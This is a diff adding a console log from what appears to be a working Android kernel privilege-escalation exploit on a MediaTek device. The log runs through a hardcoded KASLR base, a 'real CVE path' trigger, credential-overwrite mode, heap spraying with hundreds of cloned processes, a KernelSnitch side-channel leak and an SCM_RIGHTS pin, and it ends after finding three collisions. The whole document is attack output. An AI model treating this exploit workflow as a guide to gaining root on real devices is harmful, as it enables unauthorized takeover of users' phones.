@@ -1,0 +1,29 @@
+[32m[+] [0mpreload starting pid=6206
+[32m[+] [0mstartup context pid=6206 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=6206 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=6206 label=matisse_os2.0.6.0_ulkcnxm slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=6206 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff80027913a0 bootid_data=ffffff80028a77d0 init_task=ffffff800279bec0 root_tg=ffffff8002992040 sysctl_bootid=ffffff8002a60bb5
+[33m[*] [0mmt16: skipping SLIDE warmup per PSELECT_SKIP_WARMUP
+[32m[+] [0mslide-kaslr-mtk-hardcoded pid=6206 base=ffffffc008000000 slide=0000000000000000 warmup=0
+[33m[*] [0mmt19: SLIDE trigger route (real CVE path)
+[33m[*] [0mmt28c: CRED overwrite mode
+[33m[*] [0mprepare_kernel_page enter: payload=1 (0=FOPS,1=SLIDE)
+[33m[*] [0mprepare_kernel_page: ctxs ready, cloning 272 prepare + 204 spray + 33 pre + 34 post...
+[33m[*] [0mprepare_kernel_page: prepare+spray children cloned, now spray...
+[33m[*] [0mprepare_kernel_page: spray children done, setup KernelSnitch...
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[33m[*] [0mmt18-diag: ks_setup done
+[33m[*] [0mmt18-diag: pre clones done
+[33m[*] [0mmt18-diag: leak child forked
+[33m[*] [0mmt18-diag: post clones done
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000762493f0c8
+[33m[*] [0mmt47-c: leak pin via SCM_RIGHTS OK (fd=519)
+[33m[*] [0mmt18-diag: memfds opened
+[33m[*] [0mmt18-diag: pre children killed
+[33m[*] [0mmt18-diag: post children killed
+[33m[*] [0m  00000065a0069348
+[33m[*] [0mmt18-diag: spray children killed
+[33m[*] [0m  00000065a0166b30
+[33m[*] [0m  00000065a040d068
+[33m[*] [0mfound 3 collisisons
